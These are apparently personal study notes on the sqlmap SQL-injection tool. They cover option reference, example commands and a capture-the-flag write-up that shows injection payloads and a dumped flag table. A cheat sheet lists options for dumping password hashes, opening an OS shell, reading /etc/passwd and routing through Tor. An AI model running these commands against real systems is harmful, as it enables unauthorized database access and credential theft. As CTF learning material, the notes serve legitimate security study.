# SQLMap
[TOC]
###### tags: `Security` `Web` `Tools`

```shell=
sqlmap [OPTIONs] -u "URL"
```

## Easy Usage
```shell=
sqlmap -u "http://demo.testfire.net" --method=POST --data="user=admin&pass=1234" -c sqlmap.conf
#將各參數寫在sqlmap.conf中
```
```shell=
sqlmap -u "http://demo.wildfoot.tw/PAGE?id=1" --referer "http://www.google.com"
#使用referer將請求來原指向google
```
```shell=
sqlmap -u "http://login/" --auth-type="Basic" --auth-cred="admin:adminpass"
#使用基本認證
```


## 目標選項
### -u "URL"

### -d DBMS_IP
```shell=
-d "mysql://admin:admin@192.168.21.17:3306/testdb"
-d "access://c:///mydata/myacces.mds"
```
### -m SVR_LIST_FILE
從伺服器清單檔案中進行大量爬蟲作業
### -c FILE.conf
將參數寫在sqlmap.conf中

## 網頁資料選項
#### --method={POST | GET}
#### --data "Field1=value1&Field2=value2"
配合POST使用
#### --cookie "id=1;user=abc"

## 處理速度選項
#### --delay=DELAY
每組Request暫停DELAY(seconds)
#### --timeout=TIMEOUT
設定伺服器回應逾時時間(seconds)(default=30)
#### --retries=RETRIES
伺服器逾時重試次數(default=3)
#### --threads N
多執行緒(建議8以內)

## 隱匿行蹤選項
#### --hpp
傳遞的掃描資料參雜非滲透用資料

## 猜解選項
#### -p "ID,ID2"
對欄位ID,ID2進行注入
#### --skip="id,name"
對欄位id,name不進行注入
#### --dbms "DBMS-TYPE"
已知資料庫系統 Example : `MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft_Access,SQLite,Firebird,Sybase,SAP MaxDB,DB2`
#### --dbms-cred="ID:PASSW"
已知資料庫使用者帳號:密碼

## 偵測設定
#### --level=N
偵查程度 **1 (淺,快)~5 (深,慢)**
#### --risk=N
偵查漏洞的風險等級 **0 (小,快)~3 (大,慢)** (default=1)

## 猜解目標
#### -b 
猜解DBMS識別資訊(banner)
#### --current-user 
猜解目前資料庫連線的使用者名稱
#### --current-db
猜解目前資料庫
#### --is-dba
猜解目前使用者是否為DBMS的管理員
#### --users
列出此資料庫的所有使用者帳號
#### --passwords
列出此資料庫的所有使用者密碼的雜湊值
#### --privileges
列出此資料庫的所有使用者的權限
#### --roles
列出此資料庫的所有使用者的角色
#### --dbs
列出資料庫系統上有哪些資料庫
#### --table
列出有哪些資料表
#### --dump-all
猜解所有資料庫內的所有表格(不建議使用XD)

## 指定目標
#### -D DB_NAME
指定猜解的對象資料庫
#### -T Table_NAME
指定猜解的對象資料表
#### -C COLUMN_NAME
指定猜解的對象欄位
#### -U USER_ID
指定猜解的對象資料庫使用者
#### --dump 
傾印出
* 資料庫中的所有資料表中的所有資料(-D)
* 特定資料表中的所有資料(-D -T)

## 暴力猜解選項
--common-tables 利用內建字典檔猜解可能的資料表
--common-columns 利用內建字典檔猜解可能的資料欄位

## 其他選項
#### -v N
掃描過程中的資訊詳細程度 **1 (簡潔) ~ 6(詳細)**
#### --batch
在執行過程中 若需要使用者輸入資訊 一律使用預設值



## write-up
```shell=
python sqlmap.py 
--level=5 --risk=3 
#最詳細執行
--dbms="MySQL" 
#之前的調查已經發現是MySQL
-p "user,password" 
#要測試有沒有漏洞的欄位
--method=POST --data="user=Wildfoot&password=Wildfoot"
#用POST 然後欄位預設的值
-u "https://hackme.inndy.tw/gb/?mod=del&pid=4" 
-v 6 
#最詳細的執行畫面
--user-agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0" 
```
```shell=
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: user=Wildfoot' OR NOT 8219=8219-- ZGiV&password=Wildfoot
    Vector: OR NOT [INFERENCE]

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: user=Wildfoot' OR SLEEP(5)-- HQoJ&password=Wildfoot
    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
---
web server operating system: Linux Ubuntu
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.0
Database: guestbook
[3 tables]
+---------------------------------------+
| flag                                  |
| posts                                 |
| users                                 |
+---------------------------------------+

Database: information_schema
[61 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_DATAFILES                  |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TEMP_TABLE_INFO                |
| INNODB_TRX                            |
| KEY_COLUMN_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+
```
## 第二次
```shell=
python sqlmap.py 
--dbms="MySQL" 
--user-agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0" 
-u "https://hackme.inndy.tw/gb/?mod=del&pid=4" 
-v 6 
--data="user=Wildfoot&password=Wildfoot" 
--dump -D guestbook -T flag 
#dump出 guestbook.flag理面的資料
--batch
```
```shell=
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: user=Wildfoot' OR NOT 8219=8219-- ZGiV&password=Wildfoot
    Vector: OR NOT [INFERENCE]

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: user=Wildfoot' OR SLEEP(5)-- HQoJ&password=Wildfoot
    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
---
web server operating system: Linux Ubuntu
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.0
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: user=Wildfoot' OR NOT 8219=8219-- ZGiV&password=Wildfoot
    Vector: OR NOT [INFERENCE]

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: user=Wildfoot' OR SLEEP(5)-- HQoJ&password=Wildfoot
    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
---
web server operating system: Linux Ubuntu
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.0
Database: guestbook
Table: flag
[3 entries]
+----+----------------------------------------------------+----------+----------+
| id | flag                                               | padding1 | padding0 |
+----+----------------------------------------------------+----------+----------+
| 1  | http://i.giphy.com/3o72FdPiRXBRbBLUc0.gif          | 31415926 | 1337     |
| 2  | FLAG{Y0U_KN0W_SQL_1NJECT10N!!!' or 595342>123123#} | 88       | 77       |
| 3  | http://i.giphy.com/m7BTtLWhjkEJa.gif               | 9999     | 6666     |
+----+----------------------------------------------------+----------+----------+
```



## SQLmap

- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- Usage
    - `python sqlmap.py -u 'test.kaibro.tw/a.php?id=1'`
        - 庫名: `--dbs`
        - 表名: `-D dbname --tables`
        - column: `-D dbname -T tbname --columns`
        - dump: `-D dbname -T tbname --dump`
            - `--start=1`
            - `--stop=5566`
        - DBA? `--is-dba`
        - 爆帳密: `--passwords`
        - 看權限: `--privileges`
        - 拿shell: `--os-shell`
        - interative SQL: `--sql-shell`
        - 讀檔: `--file-read=/etc/passwd`
        - Delay時間: `--time-sec=10`
        - User-Agent: `--random-agent`
        - Thread: `--threads=10`
        - Level: `--level=3`
            - default: 1
        - `--technique`
            - default: `BEUSTQ`
        - Cookie: `--cookie="abc=55667788"`
        - Tor: `--tor --check-tor --tor-type=SOCKS5 --tor-port=9050`
